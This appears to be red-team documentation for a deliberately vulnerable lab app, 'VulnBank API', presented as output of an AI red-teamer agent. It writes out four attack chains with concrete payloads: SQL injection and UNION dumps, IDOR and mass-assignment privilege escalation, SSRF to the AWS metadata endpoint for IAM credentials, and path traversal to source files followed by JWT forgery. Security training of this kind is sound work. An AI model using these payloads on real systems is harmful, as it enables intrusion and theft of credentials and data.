# Attack Scenarios

Realistic attack chains against VulnBank API.
These represent what Claude's red-teamer agent generates during a session.

---

## Scenario 1: Unauthenticated to Full Database Dump

**Attacker:** External, no credentials, black-box knowledge

**Kill chain:**
```
[1] Enumerate endpoints via /openapi.json (no auth required)
    → Discovers /auth/login, /data/account, /admin/debug/tokens

[2] Hit /admin/debug/tokens (no auth required — broken function level auth)
    → Receives valid JWT tokens for ALL users including admin

[3] Use admin token → GET /data/account?owner=' OR '1'='1
    → SQL injection returns ALL account records

[4] UNION-based injection → dumps internal_notes table
    GET /data/account?owner=' UNION SELECT 1,content,0,'x' FROM internal_notes--
    → Retrieves: "AWS_SECRET_KEY=AKIAIOSFODNN7EXAMPLE", "Admin password: P@ssw0rd!"

[5] Use leaked AWS key → access cloud infrastructure
```

**Total time to full compromise:** ~5 minutes
**Prerequisites:** None
**Detection:** None (no logging)

---

## Scenario 2: Low-Privilege User to Admin

**Attacker:** Authenticated regular user (bob)

**Kill chain:**
```
[1] Login as bob → receive JWT token

[2] IDOR: GET /admin/user/1, /admin/user/2, /admin/user/3
    → All return full user records including password hashes

[3] Crack MD5 hash offline (rainbow table — seconds for common passwords)
    → Admin password recovered: "admin123"

[4] PUT /admin/user/3 with {"role": "admin"}  (mass assignment)
    → Bob's role is now "admin" — no auth check on ownership

[5] Access /admin/panel → full admin access
    → Can now delete users, access all data, trigger admin functions
```

**Total time:** ~2 minutes
**Prerequisites:** Any valid account
**Detection:** None

---

## Scenario 3: SSRF to Cloud Metadata Exfiltration

**Attacker:** Authenticated user, app deployed on AWS EC2

**Kill chain:**
```
[1] Discover /fetch endpoint via API docs

[2] Probe internal network:
    GET /fetch?url=http://localhost:6379   → Redis? (check response time)
    GET /fetch?url=http://localhost:5432   → PostgreSQL?

[3] Hit AWS metadata endpoint:
    GET /fetch?url=http://169.254.169.254/latest/meta-data/
    → Returns EC2 instance metadata

[4] Get IAM credentials:
    GET /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
    → Returns role name

    GET /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/[role-name]
    → Returns: AccessKeyId, SecretAccessKey, Token

[5] Use credentials for full AWS account access
```

**Total time:** ~3 minutes
**Prerequisites:** Valid account, app deployed on cloud VM
**Detection:** None — the /fetch endpoint has no logging

---

## Scenario 4: Path Traversal to Source Code Exfiltration

**Attacker:** Authenticated user

**Kill chain:**
```
[1] Probe path traversal:
    GET /files/download?filename=../../app/auth.py
    → Returns full source of auth.py including JWT_SECRET = "secret"

[2] Read all source files:
    ../../app/main.py → SECRET_KEY, DB_PASSWORD, INTERNAL_API_KEY
    ../../app/db.py   → DB_PASS credential
    ../../.env        → Any additional secrets (if exists)

[3] With JWT secret known → forge any token:
    import jwt
    token = jwt.encode({"sub": "admin", "role": "admin", "id": 1}, "secret", algorithm="HS256")

[4] Full admin access with forged token
```

**Total time:** ~2 minutes
**Prerequisites:** Valid account
**Detection:** None

---

## How Claude generates these

Running `/red-team-simulation` or invoking the `red-teamer` agent produces output in this format, grounded in the actual source code. Each step references a real endpoint and real parameter from the application — not generic descriptions.

This demonstrates the value of AI-assisted red teaming: the attacker perspective is informed by full source visibility, producing chains that a traditional black-box pentest might miss.
